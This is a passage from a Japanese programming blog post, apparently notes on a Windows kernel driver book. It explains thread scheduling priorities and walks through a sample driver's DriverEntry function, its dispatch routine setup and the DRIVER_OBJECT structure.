&lt;h3 id=&quot;スケジュールの優先順位&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%B1%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AE%E5%84%AA%E5%85%88%E9%A0%86%E4%BD%8D&quot; aria-label=&quot;スケジュールの優先順位 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スケジュールの優先順位&lt;/h3&gt;
&lt;p&gt;そもそもの話ですが、僕はWindowsAPIを使ったスレッド優先度の設定が何かについてそもそもよく知らなかったので簡単に調べてみました。&lt;/p&gt;
&lt;p&gt;Windows環境において、スレッドはスレッドの優先順位によってスケジュールされます。&lt;/p&gt;
&lt;p&gt;スレッドの優先順位は以下の2つの条件で決定されます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;プロセスの優先度クラス&lt;/li&gt;
&lt;li&gt;プロセスの優先度クラス内のスレッドの優先度レベル&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;プロセスの優先度クラスは以下のいずれかに属しており、&lt;code class=&quot;language-text&quot;&gt;SetPriorityClass&lt;/code&gt;によって設定することができます。&lt;/p&gt;
&lt;p&gt;デフォルトではプロセスの優先度クラスは&lt;code class=&quot;language-text&quot;&gt;THREAD_PRIORITY_NORMAL&lt;/code&gt;になるようです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;IDLE&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;LOWEST&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;BELOW_NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;ABOVE_NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;HIGHEST&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;TIME_CRITICAL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一方で、各優先度クラス内のスレッドの優先度レベルは以下のいずれかが設定されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;SetThreadPriority&lt;/code&gt;で変更することができます。&lt;/p&gt;
&lt;p&gt;こちらもデフォルトでは&lt;code class=&quot;language-text&quot;&gt;THREAD_PRIORITY_NORMAL&lt;/code&gt;が割り当てされます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;IDLE&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;LOWEST&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;BELOW_NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;ABOVE_NORMAL&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;HIGHEST&lt;/li&gt;
&lt;li&gt;THREAD&lt;em&gt;PRIORITY&lt;/em&gt;TIME_CRITICAL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setpriorityclass&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;SetPriorityClass function (processthreadsapi.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;SetThreadPriority function (processthreadsapi.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これらの組みあわせによって各スレッドの優先順位が決定するものの、以下のリンク先の表の通り通常の設定方法では、すべてのレベルの優先順位を柔軟に設定することができないようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows/win32/procthread/scheduling-priorities&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;スケジュールの優先順位 - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そこで、4章で開発するドライバとクライアントでは、スレッドの優先度を柔軟に設定できるようにすることを目標にしています。&lt;/p&gt;
&lt;h3 id=&quot;driverentry関数を作る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#driverentry%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%9C%E3%82%8B&quot; aria-label=&quot;driverentry関数を作る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DriverEntry関数を作る&lt;/h3&gt;
&lt;p&gt;ベースは&lt;a href=&quot;/windows-windriver-001-tutorial&quot;&gt;過去の記事&lt;/a&gt;で作成した手順と同じです。&lt;/p&gt;
&lt;p&gt;まずはエントリポイントになる&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数を作ります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数では、以下の処理を実装します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;アンロードルーチンの設定&lt;/li&gt;
&lt;li&gt;ドライバがサポートするディスパッチルーチンの設定&lt;/li&gt;
&lt;li&gt;デバイスオブジェクトの生成&lt;/li&gt;
&lt;li&gt;デバイスオブジェクトへのシンボリックリンクの作成&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;アンロードルーチンとデバイスオブジェクトが必要な理由は前述した通りです。&lt;/p&gt;
&lt;p&gt;詳しくは以下の「必須の標準ドライバー ルーチン」の項が参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/kernel/introduction-to-standard-driver-routines&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;標準ドライバー ルーチンの概要 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ディスパッチルーチンはIRP(受信I/O要求パケット)を処理するものです。&lt;/p&gt;
&lt;p&gt;IRPには様々な要求に対してその要求に関する情報が格納されます。&lt;/p&gt;
&lt;p&gt;カーネルドライバは、ドライバのデバイスハンドルをオープンするために、最低限&lt;code class=&quot;language-text&quot;&gt;IRP_MJ_CREATE&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;IRP_MJ_CLOSE&lt;/code&gt;のディスパッチルーチンについてはサポートする必要があるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/kernel/dispatch-routine-functionality&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ディスパッチ ルーチンの機能 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DRIVER_DISPATCH (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/dispatchcreate--dispatchclose--and-dispatchcreateclose-routines&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DispatchCreate, DispatchClose, and DispatchCreateClose Routines - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトへのシンボリックリンクを作成するのは、クライアントからカーネルドライバのデバイスオブジェクトを参照するためです。&lt;/p&gt;
&lt;p&gt;例えば&lt;code class=&quot;language-text&quot;&gt;CreateFile&lt;/code&gt;関数などは第1引数にデバイスオブジェクトのシンボリックリンクを受け取ります。&lt;/p&gt;
&lt;h2 id=&quot;driverentry関数を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#driverentry%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;driverentry関数を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DriverEntry関数を読む&lt;/h2&gt;
&lt;p&gt;ここで、実際に写経しつつ作成した&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数は次のようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;C&quot;&lt;/span&gt; NTSTATUS
&lt;span class=&quot;token function&quot;&gt;DriverEntry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_In_ PDRIVER_OBJECT DriverObject&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; _In_ PUNICODE_STRING RegistryPath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;UNREFERENCED_PARAMETER&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;RegistryPath&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;SecondDriver DriverEntry started\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;DriverUnload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverUnload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CREATE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CLOSE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_DEVICE_CONTROL&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverDeviceControl&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	UNICODE_STRING devName &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RTL_CONSTANT_STRING&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;\\Device\\SecondDriver&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token comment&quot;&gt;//RtlInitUnicodeString(&amp;amp;devName, L&quot;\\Device\\ThreadBoost&quot;);&lt;/span&gt;
	PDEVICE_OBJECT DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	NTSTATUS status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoCreateDevice&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DriverObject&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;devName&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FILE_DEVICE_UNKNOWN&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FALSE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Failed to create device (0x%08X)\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	UNICODE_STRING symLink &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RTL_CONSTANT_STRING&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;\\??\\SecondDriver&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoCreateSymbolicLink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;symLink&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;devName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Failed to create symbolic link (0x%08X)\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;IoDeleteDevice&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;SecondDriverSecondDriver DriverEntry completed successfully\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; STATUS_SUCCESS&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ディスパッチルーチンのサポート&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%91%E3%83%83%E3%83%81%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AE%E3%82%B5%E3%83%9D%E3%83%BC%E3%83%88&quot; aria-label=&quot;ディスパッチルーチンのサポート permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ディスパッチルーチンのサポート&lt;/h3&gt;
&lt;p&gt;とりあえず気になったのは以下の3行です。&lt;/p&gt;
&lt;p&gt;ここではディスパッチルーチンのセットアップを行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CREATE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CLOSE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_DEVICE_CONTROL&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverDeviceControl&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DriverObject&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;semi-documented&lt;/code&gt;な構造体で、ロードされたカーネルモードドライバーのイメージを表します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;_DRIVER_OBJECT&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  CSHORT             Type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  CSHORT             Size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDEVICE_OBJECT     DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ULONG              Flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PVOID              DriverStart&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  ULONG              DriverSize&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PVOID              DriverSection&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDRIVER_EXTENSION  DriverExtension&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  UNICODE_STRING     DriverName&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PUNICODE_STRING    HardwareDatabase&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PFAST_IO_DISPATCH  FastIoDispatch&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDRIVER_INITIALIZE DriverInit&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDRIVER_STARTIO    DriverStartIo&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDRIVER_UNLOAD     DriverUnload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  PDRIVER_DISPATCH   MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_MAXIMUM_FUNCTION &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; DRIVER_OBJECT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;PDRIVER_OBJECT&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;&lt;em&gt;DRIVER&lt;/em&gt;OBJECT (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「ロードされたカーネルモードドライバーのイメージ」とは？って感じですが&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数が呼び出されるときにカーネル側で割り当てと初期化をされた後で渡されるオブジェクトとのことで、カーネル側でよしなにしてくれたオブジェクトなんだろうなと思ってます。（調べてもよくわからなかった・・・）&lt;/p&gt;
&lt;p&gt;ここで、このドライバオブジェクトのメンバである&lt;code class=&quot;language-text&quot;&gt;MajorFunction&lt;/code&gt;にディスパッチルーチンを登録することでドライバがサポートする具体的な機能を指定できます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;MajorFunction&lt;/code&gt;は関数ポインタの配列として管理されていて、&lt;code class=&quot;language-text&quot;&gt;IRP_MJ_&lt;/code&gt;という接頭語がついたインデックスが事前定義されています。&lt;/p&gt;
&lt;p&gt;ここで、サポートするディスパッチルーチンのみ追加すればいい理由は、&lt;code class=&quot;language-text&quot;&gt;MajorFunction&lt;/code&gt;配列はカーネル側で初期化された際にすべての要素がドライバがサポートしていないIRPであることを示す&lt;code class=&quot;language-text&quot;&gt;nt!IopInvalidDeviceRequest&lt;/code&gt;に設定されているためです。&lt;/p&gt;
&lt;p&gt;そのため、サポートするディスパッチルーチンのみ更新を行う方式になっています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://social.msdn.microsoft.com/Forums/ja-JP/4f42ce1d-cbd1-4968-b458-1d96239368a8/driverobject-12392-driverentry?forum=wdksupportteamja&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DriverObject と DriverEntry&lt;/a&gt;&lt;/p&gt;
